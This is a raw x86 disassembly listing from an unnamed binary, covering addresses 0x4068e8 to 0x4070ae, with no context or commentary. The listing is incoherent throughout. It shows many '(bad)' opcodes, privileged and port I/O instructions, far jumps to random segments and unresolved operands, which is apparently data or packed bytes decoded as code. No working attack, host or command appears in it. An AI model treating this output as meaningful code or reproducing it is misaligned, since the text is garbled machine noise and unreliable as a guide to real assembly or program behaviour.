  4068e8:	dec    edi
  4068e9:	les    ecx,FWORD PTR [edx+0x5a5a32fc]
  4068ef:	mov    BYTE PTR [ecx+0x69],bh
  4068f2:	or     al,BYTE PTR [edx]
  4068f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068f5:	dec    ebp
  4068f6:	inc    eax
  4068f7:	or     edx,DWORD PTR ds:0x6a392773
  4068fd:	hlt    
  4068fe:	in     eax,0x24
  406900:	mov    al,ds:0x7ed961f8
  406905:	inc    ecx
  406906:	xor    al,0x54
  406908:	dec    ecx
  406909:	loope  0x4068b0
  40690b:	cmp    dh,BYTE PTR [ebx-0x15b0e14]
  406911:	inc    esi
  406912:	call   0x9a621dd8
  406917:	mov    dh,0xbc
  406919:	pop    ebp
  40691a:	jecxz  0x406975
  40691c:	push   cs
  40691d:	mov    edi,0xcef5529a
  406922:	sub    eax,DWORD PTR [edx-0x54f0e280]
  406928:	cs int3 
  40692a:	xor    eax,0xbd813a20
  40692f:	leave  
  406930:	and    eax,0x6a350092
  406935:	(bad)  
  406936:	js     0x4068de
  406938:	das    
  406939:	jecxz  0x406970
  40693b:	jecxz  0x406906
  40693d:	dec    eax
  40693e:	adc    al,0x80
  406940:	jne    0x406992
  406942:	dec    edi
  406943:	jns    0x406957
  406945:	inc    eax
  406946:	cmp    eax,0x2517ea47
  40694b:	and    ebp,DWORD PTR [ebp-0x75]
  40694e:	and    al,ah
  406950:	add    al,0xa1
  406952:	into   
  406953:	push   cs
  406954:	pop    eax
  406955:	jo     0x40691d
  406957:	adc    al,0x15
  406959:	jne    0x406910
  40695b:	mov    esi,0x381f041e
  406960:	and    bl,cl
  406962:	lods   eax,DWORD PTR ds:[esi]
  406963:	enter  0xcd4a,0x73
  406967:	int3   
  406968:	shr    ch,0xab
  40696b:	jmp    0x31895245
  406970:	es xor eax,0x2bc555b3
  406976:	loope  0x406925
  406978:	(bad)  
  406979:	fld    DWORD PTR [ebx]
  40697b:	fcomp  DWORD PTR [eax+0x7c]
  40697e:	add    ecx,DWORD PTR [edx]
  406980:	add    BYTE PTR [ebp+0x7bb6e3cd],cl
  406986:	push   ss
  406987:	cmp    al,BYTE PTR [ebx+0x56]
  40698a:	out    0x17,al
  40698c:	xchg   ebp,eax
  40698d:	in     al,0x3b
  40698f:	push   0x71
  406991:	add    eax,0xaaf141fd
  406996:	jns    0x40698c
  406998:	outs   dx,DWORD PTR ds:[esi]
  406999:	and    BYTE PTR [edi],bl
  40699b:	cmp    esi,DWORD PTR [edx]
  40699d:	mov    ch,0x92
  40699f:	push   es
  4069a0:	sub    ecx,DWORD PTR [ebx]
  4069a2:	call   FWORD PTR [ebx-0x45448414]
  4069a8:	iret   
  4069a9:	fwait
  4069aa:	mov    esi,0x1111beb1
  4069af:	mov    ?,WORD PTR [esi]
  4069b1:	xor    eax,0xd1547faf
  4069b6:	(bad)  
  4069b7:	int    0xc4
  4069b9:	ficom  DWORD PTR [eax]
  4069bb:	stos   BYTE PTR es:[edi],al
  4069bc:	mov    eax,ds:0xdefcb0bc
  4069c1:	pop    esi
  4069c2:	mov    cl,0xa
  4069c5:	lock cmp BYTE PTR [ebp-0x6],ch
  4069c9:	xchg   ecx,eax
  4069ca:	sahf   
  4069cb:	sbb    al,0x6c
  4069cd:	jecxz  0x4069d8
  4069cf:	lods   al,BYTE PTR ds:[esi]
  4069d0:	or     edx,edx
  4069d2:	inc    ecx
  4069d3:	mov    esi,0x7fcae812
  4069d8:	mov    ds:0x514c4b77,eax
  4069dd:	pop    esp
  4069de:	jae    0x406a1a
  4069e0:	jmp    0x4d7188d6
  4069e5:	addr16 iret 
  4069e7:	retf   
  4069e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069e9:	sbb    al,0xaf
  4069eb:	mov    eax,ds:0x71916306
  4069f0:	fld    TBYTE PTR [ecx]
  4069f2:	ret    
  4069f3:	sbb    al,0x97
  4069f5:	imul   esp,DWORD PTR [ebp-0x4e],0x3f
  4069f9:	test   cl,0x71
  4069fc:	mov    dl,bl
  4069fe:	push   ebp
  4069ff:	pop    ss
  406a00:	xor    DWORD PTR [edi+0x7c8fe1fd],0x484bc69f
  406a0a:	sub    cl,BYTE PTR [edx]
  406a0c:	pop    ebp
  406a0d:	or     al,0x94
  406a0f:	inc    ebx
  406a10:	jge    0x4069b4
  406a12:	cmp    bh,dl
  406a14:	mov    bl,0x66
  406a16:	pop    ds
  406a17:	loop   0x406a96
  406a19:	and    BYTE PTR [ebx-0x59],cl
  406a1c:	fdecstp 
  406a1e:	and    al,bh
  406a20:	xchg   DWORD PTR [edx],edx
  406a22:	sahf   
  406a23:	cdq    
  406a24:	vmread DWORD PTR [ecx],esi
  406a27:	jmp    0xe1f5:0xfcd45e85
  406a2e:	lods   eax,DWORD PTR ds:[esi]
  406a2f:	pop    esp
  406a30:	xor    bh,0x9
  406a33:	test   DWORD PTR [ebp+0x1638af90],esp
  406a39:	add    bh,BYTE PTR [eax]
  406a3b:	scas   eax,DWORD PTR es:[edi]
  406a3c:	shr    BYTE PTR [edx+0xd],0x86
  406a40:	push   0x7a
  406a42:	lods   eax,DWORD PTR ds:[esi]
  406a43:	mov    DWORD PTR [ebp+0x58],0x74d37c4e
  406a4a:	mov    dl,0xc7
  406a4c:	mov    WORD PTR [esp+eiz*2-0x6a],?
  406a50:	cmp    eax,DWORD PTR [eax]
  406a52:	cli    
  406a53:	cmc    
  406a54:	jmp    0xeaf71118
  406a59:	xchg   ebx,eax
  406a5a:	retf   0xeaff
  406a5d:	rcr    DWORD PTR [esi+edi*8-0x6fcdd049],cl
  406a64:	mov    esp,0xc3c999
  406a69:	mov    al,ds:0x5f1230d
  406a6e:	inc    ebp
  406a6f:	stos   BYTE PTR es:[edi],al
  406a70:	ss aad 0xe3
  406a73:	in     al,dx
  406a74:	xor    al,BYTE PTR [ebx]
  406a76:	mov    ebx,0x532d8a33
  406a7b:	das    
  406a7c:	or     bh,BYTE PTR [edx-0x46]
  406a7f:	loopne 0x406a2f
  406a81:	dec    esp
  406a82:	mov    DWORD PTR [eax+ebp*1+0x15],esi
  406a86:	pushf  
  406a87:	xchg   edx,eax
  406a88:	push   edx
  406a89:	sbb    al,0x31
  406a8b:	sti    
  406a8c:	(bad)  
  406a8d:	hlt    
  406a8e:	outs   dx,BYTE PTR ds:[esi]
  406a8f:	sub    BYTE PTR [edx],bh
  406a91:	fld    DWORD PTR [esi-0x4a47b348]
  406a97:	hlt    
  406a98:	cmp    al,dl
  406a9a:	xlat   BYTE PTR ds:[ebx]
  406a9b:	inc    eax
  406a9c:	push   ds
  406a9d:	fnstsw WORD PTR [esp+edi*2-0x11]
  406aa1:	aas    
  406aa2:	fucomp st(1)
  406aa4:	xor    al,dl
  406aa6:	mov    ecx,0x1b1cd20
  406aab:	call   0xcedbfe96
  406ab0:	sti    
  406ab1:	sbb    BYTE PTR [eax+0x1132917d],0xe0
  406ab8:	push   ss
  406ab9:	dec    ebp
  406aba:	stos   DWORD PTR es:[edi],eax
  406abb:	out    dx,eax
  406abc:	test   BYTE PTR [ecx],bl
  406abe:	jnp    0x406a40
  406ac0:	push   esi
  406ac1:	loop   0x406a9d
  406ac3:	add    al,0x4c
  406ac5:	test   ebp,esi
  406ac7:	gs out dx,al
  406ac9:	adc    eax,0xdd3f30c4
  406ace:	div    BYTE PTR [edx]
  406ad0:	pop    ecx
  406ad1:	inc    edi
  406ad2:	pusha  
  406ad3:	or     dl,BYTE PTR [ebp+0x1fa16be]
  406ad9:	les    ecx,FWORD PTR [ecx]
  406adb:	pop    esp
  406adc:	dec    ebx
  406add:	call   0x5087bc06
  406ae2:	clc    
  406ae3:	in     al,0x8
  406ae5:	lods   eax,DWORD PTR ds:[esi]
  406ae6:	ret    
  406ae7:	xchg   DWORD PTR [edx],ebp
  406ae9:	jbe    0x406b33
  406aeb:	jmp    0xc5f9:0x2e47
  406af1:	sub    eax,0x9788fa57
  406af6:	mov    ds:0xecb402b8,eax
  406afb:	mov    esp,0x7cd0c97a
  406b00:	jl     0x406b0e
  406b02:	push   ss
  406b03:	fadd   st(1),st
  406b05:	or     al,0x51
  406b07:	imul   ebp,DWORD PTR [ecx],0xda581ee8
  406b0d:	in     eax,0x45
  406b0f:	cs loop 0x406a95
  406b12:	bound  ebx,QWORD PTR [ecx+0x62]
  406b15:	mov    bl,0xbe
  406b17:	mov    bl,0xd5
  406b19:	mov    edi,0x87f0b23a
  406b1e:	nop
  406b1f:	hlt    
  406b20:	mov    bh,al
  406b22:	cmp    BYTE PTR [ebx+0x3b313778],dl
  406b28:	dec    edx
  406b29:	push   eax
  406b2a:	push   ss
  406b2b:	out    0x49,eax
  406b2d:	inc    eax
  406b2e:	cs retf 
  406b30:	sbb    dh,BYTE PTR [ecx+0x331f7532]
  406b36:	push   edx
  406b37:	push   cs
  406b38:	cld    
  406b39:	lods   al,BYTE PTR ds:[esi]
  406b3a:	test   BYTE PTR [esi-0x18ecb08c],0xf6
  406b41:	dec    esp
  406b42:	push   ebp
  406b43:	pushf  
  406b44:	xlat   BYTE PTR ds:[ebx]
  406b45:	push   edx
  406b46:	mov    ch,0xa6
  406b48:	xchg   esp,eax
  406b49:	sti    
  406b4a:	pop    es
  406b4b:	jp     0x406b75
  406b4d:	pop    ds
  406b4e:	push   ecx
  406b4f:	jno    0x406bb3
  406b51:	fdivr  DWORD PTR [edi]
  406b53:	jno    0x406b5b
  406b55:	cmc    
  406b56:	push   edi
  406b57:	sbb    esp,ebx
  406b59:	stc    
  406b5a:	sub    dl,0x3d
  406b5d:	push   ds
  406b5e:	inc    ecx
  406b5f:	cmp    ah,BYTE PTR [eax-0x3c]
  406b62:	or     edi,DWORD PTR [ebx+0x2a]
  406b65:	mov    eax,0x5429ed6b
  406b6a:	ficom  DWORD PTR [ebp+0x7d5803f5]
  406b70:	ins    DWORD PTR es:[edi],dx
  406b71:	ins    DWORD PTR es:[edi],dx
  406b72:	lods   eax,DWORD PTR ds:[esi]
  406b73:	push   ebp
  406b74:	test   BYTE PTR [edx-0x68],cl
  406b77:	addr16 mov bh,0x8d
  406b7a:	jne    0x406b10
  406b7c:	add    eax,DWORD PTR [ecx]
  406b7e:	shl    ah,0xba
  406b81:	ja     0x406b76
  406b83:	fimul  DWORD PTR [eax]
  406b85:	call   0x180c:0xd0e225eb
  406b8c:	fcomip st,st(7)
  406b8e:	enter  0x746e,0x6b
  406b92:	aas    
  406b93:	aad    0x7e
  406b95:	fmul   st(2),st
  406b97:	das    
  406b98:	mov    edi,0x3331f18b
  406b9d:	test   DWORD PTR [esi-0x13],eax
  406ba0:	push   ecx
  406ba1:	or     eax,0xb45dbb98
  406ba6:	loope  0x406c16
  406ba8:	push   esi
  406ba9:	dec    esp
  406baa:	pop    ss
  406bab:	fadd   DWORD PTR [esi+0x53]
  406bae:	pop    es
  406baf:	xchg   DWORD PTR [ebx-0x5b],esi
  406bb2:	cwde   
  406bb3:	das    
  406bb4:	(bad)  
  406bb5:	in     eax,0xe8
  406bb7:	mov    eax,0x742d7fa6
  406bbc:	cmp    DWORD PTR [eax],ebp
  406bbe:	fcmovnb st,st(5)
  406bc0:	dec    edx
  406bc1:	xlat   BYTE PTR ds:[ebx]
  406bc2:	sub    DWORD PTR [ebx+edi*8+0x6f7eb993],esi
  406bc9:	enter  0x50a2,0xb6
  406bcd:	add    eax,DWORD PTR [edi]
  406bcf:	mov    dh,0x5c
  406bd1:	sbb    eax,0xbb506c61
  406bd6:	pop    edi
  406bd7:	push   es
  406bd8:	out    0xd7,eax
  406bda:	xchg   esp,eax
  406bdb:	mov    ah,0x7b
  406bdd:	xor    BYTE PTR [ebp+edi*4-0x1b3deec4],cl
  406be4:	icebp  
  406be5:	and    dh,BYTE PTR [ecx-0x6d]
  406be8:	jbe    0x406b88
  406bea:	add    dh,BYTE PTR [ebp-0x47]
  406bed:	fbstp  TBYTE PTR [esi]
  406bef:	jmp    0xcb8f:0xfcc7f850
  406bf6:	xchg   edx,eax
  406bf7:	mov    edx,0x58d91f1f
  406bfc:	dec    ebx
  406bfd:	push   cs
  406bfe:	add    edi,DWORD PTR [eax+0x6db9e831]
  406c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c05:	inc    edi
  406c06:	fstp   QWORD PTR [edi]
  406c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c09:	das    
  406c0a:	mov    ds:0x18d07cf8,al
  406c0f:	sbb    DWORD PTR [edx+0x24f49e23],eax
  406c15:	je     0x406bc9
  406c17:	mov    ds:0x18232a6f,eax
  406c1c:	cli    
  406c1d:	sub    eax,0x65e45010
  406c22:	cmc    
  406c23:	shl    BYTE PTR [edx-0x17],1
  406c26:	or     DWORD PTR [ebx],ebp
  406c28:	scas   eax,DWORD PTR es:[edi]
  406c29:	mov    al,ds:0x177c332b
  406c2e:	or     al,0x7b
  406c30:	bound  ecx,QWORD PTR [ecx+0xb6bf107]
  406c36:	test   esi,ebp
  406c38:	xchg   ebp,eax
  406c39:	sub    DWORD PTR [eax],0x0
  406c3c:	aam    0xa9
  406c3e:	pop    ss
  406c3f:	cmc    
  406c40:	ss cwde 
  406c42:	xor    BYTE PTR ds:0xe657334a,dh
  406c48:	ret    0x7918
  406c4b:	sbb    al,0x15
  406c4d:	mov    esp,0x595fd5a3
  406c52:	dec    ebx
  406c53:	push   esi
  406c54:	int3   
  406c55:	pusha  
  406c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c57:	sub    bh,ch
  406c59:	mov    bl,0x5c
  406c5b:	shl    DWORD PTR [edx-0x7],0x13
  406c5f:	jl     0x406c54
  406c61:	je     0x406bfa
  406c63:	sbb    BYTE PTR [ecx-0x427f9221],dl
  406c69:	scas   al,BYTE PTR es:[edi]
  406c6a:	adc    bl,BYTE PTR fs:[edx]
  406c6d:	vmread DWORD PTR [edi-0x6b],edx
  406c71:	mov    esp,0xbe9216e1
  406c76:	pop    ecx
  406c77:	mov    dh,0xd
  406c79:	test   al,0x1
  406c7b:	inc    edx
  406c7c:	cmp    dx,WORD PTR [edx]
  406c7f:	xchg   esp,eax
  406c80:	sub    ecx,edx
  406c82:	and    eax,0x51318103
  406c87:	(bad)  
  406c88:	out    0x75,al
  406c8a:	mov    ds:0x27116d80,al
  406c8f:	retf   0xfe63
  406c92:	out    dx,al
  406c93:	scas   eax,DWORD PTR es:[edi]
  406c94:	out    dx,al
  406c95:	jg     0x406ce1
  406c97:	dec    ebx
  406c98:	daa    
  406c99:	xor    ah,ah
  406c9b:	jnp    0x406c7c
  406c9d:	adc    eax,0xab9bad69
  406ca2:	mov    ecx,0x610c0272
  406ca7:	mov    cl,0xdb
  406ca9:	push   ebp
  406caa:	cmp    eax,0x4fcab12f
  406caf:	add    edi,DWORD PTR [esi+0x4f]
  406cb2:	pop    esp
  406cb3:	iret   
  406cb4:	jne    0x406c8c
  406cb6:	(bad)  
  406cb7:	in     al,0xf8
  406cb9:	aad    0xe2
  406cbb:	mov    ds:0xde6b4c38,al
  406cc0:	sub    cl,BYTE PTR [ecx-0x37]
  406cc3:	dec    edi
  406cc4:	sbb    ch,BYTE PTR [ebx]
  406cc6:	jae    0x406c66
  406cc8:	in     al,dx
  406cc9:	sub    dh,BYTE PTR [edi+edx*8+0x2eb130e3]
  406cd0:	or     DWORD PTR [esi-0x64],edi
  406cd3:	mov    ch,0xce
  406cd5:	add    edi,edi
  406cd7:	and    bh,BYTE PTR [ebx-0x4e]
  406cda:	iret   
  406cdb:	out    dx,al
  406cdc:	mov    esp,0xbd9f5193
  406ce1:	fcompp 
  406ce3:	retf   0xda19
  406ce6:	adc    al,0xfa
  406ce8:	imul   esi,DWORD PTR [ebx-0x2d053fd4],0x5c
  406cef:	fsub   DWORD PTR [edx-0x5e98145d]
  406cf5:	jae    0x406d73
  406cf7:	mov    es:0x14edbe96,eax
  406cfd:	cmp    DWORD PTR [ebp-0x1f],esi
  406d00:	out    dx,al
  406d01:	jecxz  0x406d46
  406d03:	in     eax,0xfa
  406d05:	lds    esp,FWORD PTR [edi]
  406d07:	daa    
  406d08:	sub    edx,DWORD PTR [edx+0x1c]
  406d0b:	and    eax,0x3b811d79
  406d10:	shl    BYTE PTR ds:0x15a6b904,cl
  406d16:	scas   eax,DWORD PTR es:[edi]
  406d17:	js     0x406d59
  406d19:	call   DWORD PTR [ecx+0x6b]
  406d1c:	pop    ebp
  406d1d:	cdq    
  406d1e:	stos   BYTE PTR es:[edi],al
  406d1f:	or     eax,0xcfa28100
  406d24:	mov    ch,BYTE PTR [edx-0x2f]
  406d27:	test   eax,0x332424cf
  406d2c:	adc    al,0x70
  406d2e:	dec    DWORD PTR [edi+0x1455b227]
  406d34:	sub    eax,0x33b3a505
  406d39:	push   esp
  406d3a:	push   esi
  406d3b:	aad    0xb3
  406d3d:	ret    0x9584
  406d40:	xor    cl,BYTE PTR [ecx+0x10acaaea]
  406d46:	jno    0x406d1c
  406d48:	cld    
  406d49:	xchg   al,bl
  406d4b:	jecxz  0x406cfb
  406d4d:	dec    edi
  406d4e:	mov    esp,0xd959f95
  406d53:	lock fsincos 
  406d56:	sub    al,dh
  406d58:	ins    BYTE PTR es:[edi],dx
  406d59:	mov    ds:0x4f39aceb,al
  406d5e:	push   ebx
  406d5f:	sub    eax,0x72467cf7
  406d64:	jo     0x406d35
  406d66:	adc    ah,ah
  406d68:	(bad)  
  406d69:	mov    ch,BYTE PTR [edx-0x652740f7]
  406d6f:	sbb    bl,0x6
  406d72:	repnz lock inc ebp
  406d75:	rol    BYTE PTR [eax+0x74c559dd],0x47
  406d7c:	sbb    eax,0xc4631954
  406d81:	jbe    0x406d3e
  406d83:	push   ebp
  406d84:	(bad)  
  406d85:	xchg   BYTE PTR [eax+0xb1fd43a],bl
  406d8b:	test   DWORD PTR [ebx+0x572bff],edx
  406d91:	ja     0x406da9
  406d93:	pop    ebx
  406d94:	push   ebx
  406d95:	and    al,0xdb
  406d97:	fld    QWORD PTR [esi]
  406d99:	xor    al,0xea
  406d9b:	push   0x579be67c
  406da0:	jl     0x406da7
  406da2:	xchg   edi,eax
  406da3:	outs   dx,BYTE PTR ds:[esi]
  406da4:	lock mov ebx,0x52407190
  406daa:	das    
  406dab:	adc    DWORD PTR [ecx-0x5befbf05],esi
  406db1:	ds mov bh,0xe2
  406db4:	push   eax
  406db5:	pop    ebx
  406db6:	or     eax,0x6f882c52
  406dbb:	adc    al,0xb3
  406dbd:	adc    eax,DWORD PTR [esi-0xb]
  406dc0:	nop
  406dc1:	es in  al,0xed
  406dc4:	adc    edx,DWORD PTR [edx+0x1b39d3f]
  406dca:	arpl   WORD PTR [ecx-0x6b],ax
  406dcd:	daa    
  406dce:	fld    DWORD PTR [ecx+0x76]
  406dd1:	or     bl,dl
  406dd3:	pusha  
  406dd4:	inc    esi
  406dd5:	fs pop edx
  406dd7:	mov    al,0x16
  406dd9:	pop    edi
  406dda:	mov    ds:0xffc3a77a,eax
  406ddf:	(bad)  
  406de0:	dec    ebp
  406de1:	fiadd  WORD PTR [ebx+ebp*8-0x51277de6]
  406de9:	repnz xor DWORD PTR ds:0xa8164091,esp
  406df0:	lds    eax,FWORD PTR [ecx-0x5de036cd]
  406df6:	shr    DWORD PTR [edi+0x3b],cl
  406df9:	fs or  al,0x22
  406dfc:	popf   
  406dfd:	ret    
  406dfe:	repz jbe 0x406dc5
  406e01:	(bad)  
  406e02:	cmp    eax,0x9b24af10
  406e07:	cmp    DWORD PTR [ecx-0x784ff3b5],esp
  406e0d:	fxam   
  406e0f:	jmp    0x406e17
  406e11:	adc    BYTE PTR [edi-0x1e4b1fd0],cl
  406e17:	jo     0x406e41
  406e19:	into   
  406e1a:	inc    ebp
  406e1b:	cmc    
  406e1c:	jle    0x406e5e
  406e1e:	pop    ebx
  406e1f:	lds    ecx,FWORD PTR [esp+ebx*1+0x74787d79]
  406e26:	int    0x23
  406e28:	popf   
  406e29:	clc    
  406e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e2b:	adc    BYTE PTR [ebp-0xc],al
  406e2e:	pop    ebx
  406e2f:	pushf  
  406e30:	ror    ebx,0xe8
  406e33:	push   0x2e
  406e35:	xchg   esi,eax
  406e36:	add    eax,0x5d5cf401
  406e3b:	js     0x406e4a
  406e3d:	std    
  406e3e:	mov    ah,0x93
  406e40:	jbe    0x406e43
  406e42:	enter  0xd48f,0x18
  406e46:	or     bh,BYTE PTR [edi+0x389e2d47]
  406e4c:	xlat   BYTE PTR ds:[ebx]
  406e4d:	call   0xe502f28e
  406e52:	dec    edi
  406e53:	pop    ebp
  406e54:	or     eax,0xf6829b3e
  406e59:	xlat   BYTE PTR ds:[ebx]
  406e5a:	test   eax,0x239eb1e1
  406e5f:	pop    esi
  406e60:	sar    BYTE PTR [eax-0x54],0x9f
  406e64:	sub    edx,edi
  406e66:	sbb    cl,0x2
  406e69:	daa    
  406e6a:	xchg   ebp,eax
  406e6b:	ret    0x9c52
  406e6e:	mov    WORD PTR [ebx],?
  406e70:	inc    ebx
  406e71:	scas   al,BYTE PTR es:[edi]
  406e72:	mov    dl,0x2e
  406e74:	add    al,0x9b
  406e76:	enter  0x5146,0xc9
  406e7a:	imul   ebp,DWORD PTR [ecx-0x30ba570c],0xfaee3da8
  406e84:	loope  0x406e2f
  406e86:	icebp  
  406e87:	pop    esp
  406e88:	adc    eax,0x840ab269
  406e8d:	push   0xaa7132a7
  406e92:	in     eax,0x8e
  406e94:	jecxz  0x406f07
  406e96:	arpl   WORD PTR ds:0xea350baa,si
  406e9c:	push   edx
  406e9d:	adc    ebp,ecx
  406e9f:	out    dx,eax
  406ea0:	in     al,dx
  406ea1:	cmp    al,0x27
  406ea3:	mov    ebp,0x1fa47e31
  406ea8:	mov    esi,0x70211f27
  406ead:	sbb    al,0xc0
  406eaf:	pusha  
  406eb0:	mov    BYTE PTR [edx+0x5f248294],dl
  406eb6:	xchg   BYTE PTR [ecx+0x50],dl
  406eb9:	daa    
  406eba:	bound  esp,QWORD PTR ds:0x122ad7d7
  406ec0:	xchg   esp,eax
  406ec1:	imul   ecx,DWORD PTR [eax-0x5b],0x7e16c1a6
  406ec8:	rol    DWORD PTR es:[ebx+edi*2],1
  406ecc:	rol    DWORD PTR [edx],0xaf
  406ecf:	int3   
  406ed0:	pop    ebp
  406ed1:	nop
  406ed2:	in     al,0xe7
  406ed4:	mov    dh,dh
  406ed6:	test   al,0xb2
  406ed8:	push   ds
  406ed9:	call   0xc025c899
  406ede:	xlat   BYTE PTR ds:[ebx]
  406edf:	out    dx,eax
  406ee0:	repnz pop edi
  406ee2:	out    0x3d,eax
  406ee4:	mov    es:0xf4a244f8,al
  406eea:	outs   dx,BYTE PTR ds:[esi]
  406eeb:	scas   al,BYTE PTR es:[edi]
  406eec:	in     al,dx
  406eed:	pop    ebp
  406eee:	inc    edx
  406eef:	push   ebp
  406ef0:	je     0x406f67
  406ef2:	xor    al,0x5c
  406ef4:	cmc    
  406ef5:	or     eax,0xa484dd0f
  406efa:	and    eax,0x55451b31
  406eff:	retf   0x4a9b
  406f02:	add    eax,0x12fb5b5a
  406f07:	cwde   
  406f08:	outs   dx,BYTE PTR ds:[esi]
  406f09:	sti    
  406f0a:	je     0x406f33
  406f0c:	sbb    eax,0xf2e13cd7
  406f11:	je     0x406f19
  406f13:	inc    ecx
  406f14:	push   eax
  406f15:	mov    DWORD PTR [esi-0x2b7894a],edx
  406f1b:	inc    ecx
  406f1c:	cwde   
  406f1d:	mov    WORD PTR [esi],fs
  406f1f:	inc    ebx
  406f20:	mov    ah,0xc2
  406f22:	(bad)  
  406f23:	add    DWORD PTR [esi+0x57],edx
  406f26:	mov    eax,ds:0x8d48d962
  406f2b:	xor    DWORD PTR [edi-0x57],ebp
  406f2e:	push   esi
  406f2f:	cmp    eax,0x30fbdd5d
  406f34:	adc    eax,0x290385bb
  406f39:	sahf   
  406f3a:	sti    
  406f3b:	mov    ecx,0x8942520a
  406f40:	mov    ecx,DWORD PTR ds:0x13d2dc04
  406f46:	(bad)  
  406f48:	mov    eax,ds:0xf590a63c
  406f4d:	ret    
  406f4e:	aaa    
  406f4f:	mov    al,ds:0x60e7afb6
  406f54:	pushf  
  406f55:	push   cs
  406f56:	ja     0x406f25
  406f58:	mov    eax,0xb5bf5a6f
  406f5d:	or     ebx,ebp
  406f5f:	es mov dh,0x82
  406f62:	test   BYTE PTR [esi],dh
  406f64:	int3   
  406f65:	fcomp  QWORD PTR [ebx+0x6c]
  406f68:	adc    bl,BYTE PTR [eax]
  406f6a:	inc    ecx
  406f6b:	call   0x8bcb:0x5766b0e6
  406f72:	loope  0x406f36
  406f74:	repnz xchg esi,ebx
  406f77:	ret    0x276c
  406f7a:	xchg   ebp,eax
  406f7b:	or     DWORD PTR [eax+ecx*1-0x70],0x2f
  406f80:	into   
  406f81:	and    BYTE PTR [eax],0x8
  406f84:	inc    esp
  406f85:	icebp  
  406f86:	sub    al,0x95
  406f88:	jge    0x406f64
  406f8a:	add    esp,DWORD PTR [esi+eax*8+0x20f5f4bd]
  406f91:	dec    eax
  406f92:	mov    ebp,0x4ab123f6
  406f97:	ins    DWORD PTR es:[edi],dx
  406f98:	out    0x25,al
  406f9a:	push   eax
  406f9b:	retf   
  406f9c:	add    ebp,DWORD PTR [esi]
  406f9e:	stos   BYTE PTR es:[edi],al
  406f9f:	aaa    
  406fa0:	aaa    
  406fa1:	push   edi
  406fa2:	aam    0x75
  406fa4:	mov    dh,0xc6
  406fa6:	mov    DWORD PTR [ebp-0x2520905d],0x6a392d8f
  406fb0:	or     BYTE PTR [edi+0x30],ch
  406fb3:	shl    BYTE PTR [eax+0x2e],cl
  406fb6:	out    0x9a,al
  406fb8:	push   edi
  406fb9:	inc    ebp
  406fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fbb:	xor    eax,0x2ba0296d
  406fc0:	retf   0x4d68
  406fc3:	scas   eax,DWORD PTR es:[edi]
  406fc4:	sub    DWORD PTR [eax-0x6bbf1ec6],ebp
  406fca:	adc    ecx,edi
  406fcc:	inc    ecx
  406fcd:	int3   
  406fce:	xor    ebp,DWORD PTR [edi+ecx*8-0x79]
  406fd2:	cwde   
  406fd3:	loope  0x406f9f
  406fd5:	jg     0x406f68
  406fd7:	aaa    
  406fd8:	in     eax,dx
  406fd9:	(bad)  
  406fda:	xor    DWORD PTR [esi-0x70],ecx
  406fdd:	stc    
  406fde:	fs xchg ecx,ebp
  406fe1:	inc    esp
  406fe2:	(bad)
  406fe6:	inc    ecx
  406fe7:	inc    ecx
  406fe8:	mov    esp,0x73e55602
  406fed:	imul   eax,DWORD PTR [eax-0x3392528f],0x3a
  406ff4:	out    0x91,al
  406ff6:	(bad)  
  406ff7:	sti    
  406ff8:	xchg   ecx,eax
  406ff9:	stos   BYTE PTR es:[edi],al
  406ffa:	xchg   edi,eax
  406ffb:	sub    DWORD PTR [ebp-0x7a589df2],0x51eb24b4
  407005:	cmc    
  407006:	mov    WORD PTR [edi+0x5a],fs
  407009:	rcl    DWORD PTR [ebx],1
  40700b:	in     al,dx
  40700c:	ficom  DWORD PTR [esi+0x752aade8]
  407012:	aaa    
  407013:	push   0x17
  407015:	mov    eax,DWORD PTR [eax-0x8]
  407018:	dec    esp
  407019:	push   ecx
  40701a:	scas   eax,DWORD PTR es:[edi]
  40701b:	cmp    BYTE PTR [ecx-0x3b43147e],0x36
  407022:	cmp    al,0xcd
  407024:	push   ds
  407025:	loopne 0x40701a
  407027:	push   cs
  407028:	inc    esp
  407029:	xlat   BYTE PTR ds:[ebx]
  40702a:	push   ebx
  40702b:	dec    esp
  40702c:	xor    edx,esp
  40702e:	es jbe 0x40704f
  407031:	stos   DWORD PTR es:[edi],eax
  407032:	pop    ss
  407033:	ficom  DWORD PTR [edi+0x22b5b5de]
  407039:	fadd   st,st(2)
  40703b:	in     eax,0xd5
  40703d:	adc    BYTE PTR [ebp-0x256e482f],0x7b
  407044:	sub    eax,0x6e3e70a0
  407049:	push   esi
  40704a:	fcom   DWORD PTR [ecx]
  40704c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40704d:	xor    BYTE PTR [edx-0x50],ah
  407050:	push   ebx
  407051:	sub    ebx,esi
  407053:	mov    ds,WORD PTR [ebx]
  407055:	mov    ebp,0x73479ee4
  40705a:	test   DWORD PTR [ebx-0x5291b4fc],edx
  407060:	inc    ebx
  407061:	push   ss
  407062:	mov    BYTE PTR ds:0x1fba59bf,bl
  407068:	pop    ecx
  407069:	data16 rol BYTE PTR [edx],1
  40706c:	(bad)  
  40706d:	ficomp DWORD PTR [edi-0x2cc20dc6]
  407073:	(bad)  
  407074:	scas   eax,DWORD PTR es:[edi]
  407075:	mov    eax,0x156ad5a9
  40707a:	rcr    BYTE PTR [ecx+0x18],cl
  40707d:	pop    esp
  40707e:	xlat   BYTE PTR ds:[ebx]
  40707f:	stos   BYTE PTR es:[edi],al
  407080:	xchg   ebp,eax
  407081:	in     eax,0xbc
  407083:	arpl   ax,bp
  407085:	in     eax,0x8a
  407087:	pop    es
  407088:	sti    
  407089:	shl    eax,1
  40708b:	in     al,0x7a
  40708d:	(bad)  
  40708e:	out    0x23,al
  407090:	and    esi,DWORD PTR [edi+0x559bb0f7]
  407096:	xchg   esi,eax
  407097:	rol    BYTE PTR [edi-0x469556d9],1
  40709d:	sbb    al,0x87
  40709f:	lods   eax,DWORD PTR ds:[esi]
  4070a0:	pop    es
  4070a1:	add    ebx,ecx
  4070a3:	cli    
  4070a4:	jg     0x407057
  4070a6:	pop    es
  4070a7:	xlat   BYTE PTR ds:[ebx]
  4070a8:	lea    esp,ds:0xa6c1babb
  4070ae:	sbb    dl,bh
